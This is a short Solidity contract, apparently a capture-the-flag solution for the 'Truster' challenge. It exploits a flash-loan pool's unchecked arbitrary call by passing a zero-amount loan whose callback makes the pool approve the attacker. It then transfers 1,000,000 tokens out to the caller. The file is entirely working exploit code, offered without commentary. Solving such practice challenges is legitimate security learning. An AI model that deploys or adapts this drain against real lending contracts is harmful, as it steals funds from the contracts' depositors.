// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
contract TrusterHacker {
    function hack(address pool, address target) external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 1000000e18);
        (bool success,) = pool.call(abi.encodeWithSignature("flashLoan(uint256,address,address,bytes)", 0, msg.sender, target, data));
        require(success, "tx failed");
        IERC20(target).transferFrom(pool, msg.sender, 1000000e18);
    }
}